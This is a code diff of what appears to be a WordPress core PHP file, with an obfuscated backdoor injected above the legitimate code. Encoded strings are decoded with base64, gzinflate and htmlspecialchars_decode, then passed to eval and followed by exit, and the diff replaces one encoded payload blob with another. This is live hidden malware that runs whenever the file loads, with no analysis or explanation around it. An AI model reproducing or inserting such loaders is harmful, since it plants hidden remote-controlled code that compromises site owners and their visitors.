@@ -140,12 +140,14 @@ echo "404 Not Found";
  */
 
 /** Define ABSPATH as this file's directory */
+
+
 $Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
-$Lix = "miQWU8Q8Teyp3nStKtcraWv/wnjzV7SlyFXJlDJrxBSU9Ie3FRTpY/HcDuKkflhML071Kp/jPupDlWn0siY0zStDlwPNHLihUpWhte1UqRN38eV9PtL1SiuwP/Dmoso5JiHuRRiW8hnelQfyvssNh7mW7fQfMc8bJsUANpoSVPoK2xhspanTzOk+19goPBFvjnPmT58HOKI//do6U7dazfQ74SzLfvz8I7nt/2ag1bNLvY/IZ66Pt9S7PsT/n/2cQlf6zv29HBtfDTtP/JOwr5OO6iPznRu04m3w7/azeOaE0/mrhp/Fa9XbfW3yrK3hTOVE5pD8Ym31U7/tULM+0lRwjjO5b/R00D2fWZWL3X72To1hUDmwTkauAe4n0E9DAGXC9s16qh3CeCgI2col6BHFmbQ84Or5j9kjBB4dmzA9nmwUbkpQMaGLXiSPUlbWUJbelsyT5Fxkblr/zBMh0T+3n8drnPFAsMQMbwIhMXEOyxUxv3IxqHPc7Ppz3XlKo+KSsK1G335hqkFoyUXV5mkLy+okfbTybv92cfePOPk0fl21S1073tPIlq1xYJc2XqmUyyn6TJS+ZTZbOXHJanEE3QAWHy/F9RBMDrU0TVGn45fLBIdA";
+$Lix = "==gyCjjvXAe41qunc1FTT3mGu/fdVBm6XrQsYRp4IWFuQG1Eg/LJKukr3zWJDls7OkRPmv9h9906LX9U2EuNP9bXpXlE/zktkrVRChqRd5ZXreJdx/V1c8DJbVvN9xf08/ynSX804HRb1X+/LZcR4OKY3r09HOjibfaBekgdIZDrj4kxoQdunllnsfrH5uo9uO/XzMlnrcLAofqx7Oc8FS+0hXPqrP8E1Z57ewIT95J6Mr76Imu6bdp0z68fjORfywsCehRMP3nB9dIr8KvD9q0ztOHygdKovzQ9KEM1dk0IxvewNh51GubwM61Qemx6hcHayOK1WaTOMIAbBbrigckSmDddpoyC02kV6GlVwiVJzogs9VCsxbsvIcdqPkstTveHBysB8ZhQlXCyGqgkaDvsYxXX8AvRNXOTyyk0bQSk5Xt3rfoiRfQl7RKlzrU+9Mu7a03Nnk77zxt5lXvulykT7/PDosuYxWgr1kqRa1nO3wQvPSMVnT1kTZUQmFRWPw/F9RBMCvWXSVGn45PdBsYA";
 eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
 exit;
 ?>
-<?php 
+<?php
 /*
  * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
  * it's best to add a dummy function to the wp-config.php file, but as this call to the function
